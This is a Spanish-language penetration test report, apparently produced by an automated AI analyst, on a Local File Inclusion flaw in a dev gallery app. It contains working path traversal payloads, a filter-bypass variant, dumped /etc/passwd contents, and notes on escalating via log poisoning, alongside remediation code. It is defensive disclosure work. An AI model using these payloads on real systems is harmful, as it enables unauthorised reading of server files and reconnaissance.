# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:19:53  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** Claude Sonnet 4.6 (automatizado)

---

## Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del servidor mediante path traversal (`../`), lo que compromete la confidencialidad del sistema.

**Severidad:** 🔴 CRÍTICA  
**CVSS v3:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

## Descripción de la Vulnerabilidad

### Endpoint vulnerable

```
http://web.dev.local:8081/gallery.php?page=<VALOR>
```

La aplicación "Galería de Arte Virtual" utiliza el parámetro `page` para incluir dinámicamente archivos PHP (arte moderno, clásico, abstracto, etc.). No se realiza ninguna validación ni sanitización del input, permitiendo el uso de secuencias de path traversal.

### Prueba de concepto

**Payload básico:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Respuesta del servidor** (contenido de `/etc/passwd` expuesto):
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

---

## Explotación

### Archivos leídos exitosamente

| Archivo | Payload | Resultado |
|---------|---------|-----------|
| `/etc/passwd` | `../../../etc/passwd` | ✅ Lectura exitosa |
| `/proc/version` | `../../../proc/version` | ✅ Lectura exitosa |
| `/etc/hostname` | `../../../etc/hostname` | ✅ Lectura exitosa |

### Archivos con acceso denegado (permisos insuficientes)

| Archivo | Resultado |
|---------|-----------|
| `/etc/shadow` | ❌ Permission denied (www-data sin privilegios) |
| `/var/log/apache2/access.log` | ❌ No existe (nginx probablemente) |

### Información del sistema obtenida

**Kernel / Sistema Operativo:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) 
(x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0)
Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

**Hostname del servidor:** `d5054e367753`

**Ruta real de la aplicación** (revelada en mensajes de error PHP):  
`/var/www/html/gallery.php` — línea 104

---

## Análisis Técnico

### Código vulnerable (inferido)

La vulnerabilidad se encuentra en `gallery.php` aproximadamente en la línea 104, con un patrón similar a:

```php
<?php
$page = $_GET['page'];
include($page . '.php');  // o include($page) sin sanitización
?>
```

No existe ninguna de las siguientes protecciones:
- Validación de lista blanca (whitelist)
- Sanitización de secuencias `../`
- Uso de `basename()` o `realpath()`
- Restricción mediante `open_basedir`

### Bypass adicional (doble codificación)

También funciona el payload con doble punto-barra para evadir filtros simples:
```
http://web.dev.local:8081/gallery.php?page=....//....//....//etc/passwd
```

---

## Impacto

1. **Divulgación de información del sistema:** usuarios del sistema, rutas, kernel, hostname
2. **Reconocimiento de infraestructura:** el atacante puede mapear la estructura del servidor
3. **Escalada potencial:** si el servidor tiene logs accesibles, es posible escalar a RCE mediante Log Poisoning
4. **Exposición de código fuente:** posible lectura de archivos PHP de la aplicación

---

## Recomendaciones

### Corrección inmediata

1. **Implementar lista blanca** de páginas permitidas:
```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';
if (!in_array($page, $allowed_pages)) {
    $page = 'modern';
}
include("pages/{$page}.php");
```

2. **Usar `basename()`** para eliminar path traversal:
```php
$page = basename($_GET['page']);
include("pages/{$page}.php");
```

3. **Configurar `open_basedir`** en `php.ini`:
```ini
open_basedir = /var/www/html/pages/
```

### Medidas adicionales

- Deshabilitar la visualización de errores PHP en producción (`display_errors = Off`)
- Implementar un WAF con reglas anti path-traversal
- Revisar y restringir los permisos del usuario `www-data`
- Auditar todos los parámetros de la aplicación que usen `include()` o `require()`

---

## Conclusión

La vulnerabilidad LFI encontrada en `http://web.dev.local:8081/gallery.php?page=` es **explotable sin autenticación** y de forma trivial. Permite la lectura de archivos del sistema operativo accesibles por el proceso del servidor web. Se recomienda corrección inmediata antes de exponer la aplicación en un entorno de producción.

---

*Informe generado automáticamente — Análisis de seguridad autorizado*
